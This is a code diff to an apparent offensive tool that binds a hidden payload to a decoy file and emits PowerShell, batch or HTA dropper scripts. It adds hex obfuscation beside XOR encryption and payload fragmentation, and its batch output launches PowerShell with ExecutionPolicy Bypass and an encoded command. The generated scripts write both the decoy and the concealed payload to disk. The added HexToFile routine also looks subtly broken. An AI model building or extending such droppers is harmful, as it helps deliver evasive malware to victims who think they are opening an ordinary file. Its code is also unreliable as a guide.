@@ -8,16 +8,12 @@ const FileInputSchema = z.object({
   content: z.string(), // Base64 Data URI
 });
 
-const EncryptionSchema = z.object({
-    type: z.literal('xor'),
-    key: z.string(),
-});
-
 const MergePayloadsInputSchema = z.object({
   payload: FileInputSchema,
   benign: FileInputSchema,
   outputFormat: z.enum(['ps1', 'bat', 'hta']),
-  encryption: EncryptionSchema.optional(),
+  obfuscationType: z.enum(['none', 'xor', 'hex']).default('none'),
+  encryptionKey: z.string().optional(),
   useFragmentation: z.boolean().optional(),
 });
 
@@ -47,35 +43,42 @@ function xorEncrypt(data: string, key: string): string {
     return result;
 }
 
-const generatePowershellDropper = (payloadName: string, payloadBase64: string, benignName: string, benignBase64: string, encryption?: z.infer<typeof EncryptionSchema>, useFragmentation?: boolean): string => {
+const generatePowershellDropper = (payloadName: string, payloadString: string, benignName: string, benignBase64: string, obfuscationType: MergePayloadsInput['obfuscationType'], encryptionKey?: string, useFragmentation?: boolean): string => {
     
     let payloadSection: string;
+    let payloadDecoding: string;
 
     if (useFragmentation) {
         const chunkSize = 1000;
         const chunks = [];
-        for (let i = 0; i < payloadBase64.length; i += chunkSize) {
-            chunks.push(payloadBase64.substring(i, i + chunkSize));
+        for (let i = 0; i < payloadString.length; i += chunkSize) {
+            chunks.push(payloadString.substring(i, i + chunkSize));
         }
         const chunkString = chunks.map(c => `@"${c}"@`).join(',');
-        payloadSection = `$payloadChunks = ${chunkString}\n$payloadBase64 = $payloadChunks -join ''`;
+        payloadSection = `$payloadChunks = ${chunkString}\n$payloadData = $payloadChunks -join ''`;
     } else {
-        payloadSection = `$payloadBase64 = @"
-${payloadBase64}
-"@`;
+        payloadSection = `$payloadData = @"\n${payloadString}\n"@`;
     }
 
-    if (encryption && encryption.type === 'xor') {
-        payloadSection += `
-$key = "${encryption.key}"
-$encryptedBytes = [System.Convert]::FromBase64String($payloadBase64)
+    if (obfuscationType === 'xor' && encryptionKey) {
+        payloadDecoding = `
+$key = "${encryptionKey}"
+$encryptedBytes = [System.Convert]::FromBase64String($payloadData)
 $keyBytes = [System.Text.Encoding]::ASCII.GetBytes($key)
 $payloadFileBytes = New-Object byte[] $encryptedBytes.Length
 for ($i = 0; $i -lt $encryptedBytes.Length; $i++) {
     $payloadFileBytes[$i] = $encryptedBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
 }`;
-    } else {
-        payloadSection += `\n$payloadFileBytes = [System.Convert]::FromBase64String($payloadBase64)`;
+    } else if (obfuscationType === 'hex') {
+        payloadDecoding = `
+$hexString = $payloadData -replace ' '
+$payloadFileBytes = New-Object byte[] ($hexString.Length / 2)
+for ($i = 0; $i -lt $hexString.Length; $i += 2) {
+    $payloadFileBytes[$i/2] = [System.Convert]::ToByte($hexString.Substring($i, 2), 16)
+}`;
+    }
+    else { // 'none' or default to Base64
+        payloadDecoding = `\n$payloadFileBytes = [System.Convert]::FromBase64String($payloadData)`;
     }
     
     return `
@@ -89,6 +92,7 @@ ${benignBase64}
 "@
     
     ${payloadSection}
+    ${payloadDecoding}
     
     [IO.File]::WriteAllBytes($benignFilePath, [System.Convert]::FromBase64String($benignFileBase64))
     [IO.File]::WriteAllBytes($payloadFilePath, $payloadFileBytes)
@@ -109,27 +113,31 @@ ${benignBase64}
 export async function mergePayloads(input: MergePayloadsInput): Promise<MergePayloadsOutput> {
   try {
     const validatedInput = MergePayloadsInputSchema.parse(input);
-    const { payload, benign, outputFormat, encryption, useFragmentation } = validatedInput;
+    const { payload, benign, outputFormat, obfuscationType, encryptionKey, useFragmentation } = validatedInput;
 
     let payloadBase64 = decodeDataUri(payload.content);
     const benignBase64 = decodeDataUri(benign.content);
 
-    if (encryption && encryption.type === 'xor') {
+    let payloadString = payloadBase64; // Default to base64
+
+    if (obfuscationType === 'xor' && encryptionKey) {
         // We encrypt the raw bytes, then Base64 encode the encrypted result
         const rawPayload = Buffer.from(payloadBase64, 'base64');
-        const encryptedPayload = Buffer.from(xorEncrypt(rawPayload.toString('latin1'), encryption.key), 'latin1');
-        payloadBase64 = encryptedPayload.toString('base64');
+        const encryptedPayload = Buffer.from(xorEncrypt(rawPayload.toString('latin1'), encryptionKey), 'latin1');
+        payloadString = encryptedPayload.toString('base64');
+    } else if (obfuscationType === 'hex') {
+        payloadString = Buffer.from(payloadBase64, 'base64').toString('hex');
     }
     
     let scriptContent = '';
 
     switch (outputFormat) {
         case 'ps1':
-            scriptContent = generatePowershellDropper(payload.name, payloadBase64, benign.name, benignBase64, encryption, useFragmentation);
+            scriptContent = generatePowershellDropper(payload.name, payloadString, benign.name, benignBase64, obfuscationType, encryptionKey, useFragmentation);
             break;
         
         case 'bat':
-            const psScript = generatePowershellDropper(payload.name, payloadBase64, benign.name, benignBase64, encryption, useFragmentation);
+            const psScript = generatePowershellDropper(payload.name, payloadString, benign.name, benignBase64, obfuscationType, encryptionKey, useFragmentation);
             const encodedPsScript = Buffer.from(psScript, 'utf16le').toString('base64');
             scriptContent = `@echo off\npowershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${encodedPsScript}`;
             break;
@@ -140,25 +148,25 @@ export async function mergePayloads(input: MergePayloadsInput): Promise<MergePay
             if (useFragmentation) {
                 const chunkSize = 500;
                 const chunks = [];
-                for (let i = 0; i < payloadBase64.length; i += chunkSize) {
-                    chunks.push(payloadBase64.substring(i, i + chunkSize));
+                for (let i = 0; i < payloadString.length; i += chunkSize) {
+                    chunks.push(payloadString.substring(i, i + chunkSize));
                 }
                 const chunkString = chunks.map(c => `"${c}"`).join(" & ");
-                payloadProcessingSection = `payloadB64 = ${chunkString}`;
+                payloadProcessingSection = `payloadData = ${chunkString}`;
             } else {
-                payloadProcessingSection = `payloadB64 = "${payloadBase64}"`;
+                payloadProcessingSection = `payloadData = "${payloadString}"`;
             }
 
-            if (encryption && encryption.type === 'xor') {
+            if (obfuscationType === 'xor' && encryptionKey) {
                 payloadProcessingSection += `
-                key = "${encryption.key}"
+                key = "${encryptionKey}"
                 
                 ' Decrypt the payload
                 Dim encryptedBytes, keyBytes, i
                 Set oXML = CreateObject("MSXML2.DOMDocument")
                 Set oNode = oXML.CreateElement("base64")
                 oNode.DataType = "bin.base64"
-                oNode.Text = payloadB64
+                oNode.Text = payloadData
                 encryptedBytes = oNode.NodeTypedValue
                 
                 keyBytes = StrToBytes(key)
@@ -176,9 +184,12 @@ export async function mergePayloads(input: MergePayloadsInput): Promise<MergePay
                     .Close
                 End With
                 `;
-            } else {
+            } else if (obfuscationType === 'hex') {
                  payloadProcessingSection += `
-                Call Base64ToFile(payloadB64, payloadFilePath)`;
+                Call HexToFile(payloadData, payloadFilePath)`;
+            } else { // none (base64)
+                 payloadProcessingSection += `
+                Call Base64ToFile(payloadData, payloadFilePath)`;
             }
 
             const vbsPayload = `
@@ -199,6 +210,21 @@ export async function mergePayloads(input: MergePayloadsInput): Promise<MergePay
 
                 ' Close the HTA window
                 window.close()
+
+                Sub HexToFile(sHex, sFile)
+                    Dim aHex, i, s, oS
+                    sHex = Replace(sHex, " ", "")
+                    aHex = Split(Mid(sHex, 1, Len(sHex) - (Len(sHex) Mod 2)), " ")
+                    Set oS = CreateObject("ADODB.Stream")
+                    oS.Type = 1
+                    oS.Open
+                    For i = 0 to UBound(aHex)
+                      s = Mid(sHex, (i*2)+1, 2)
+                      If Len(s) > 0 Then oS.WriteText Chr(CByte("&H" & s))
+                    Next
+                    oS.SaveToFile sFile, 2
+                    oS.Close
+                End Sub
 
                 Sub Base64ToFile(B64, FileName)
                     Dim oXML, oNode
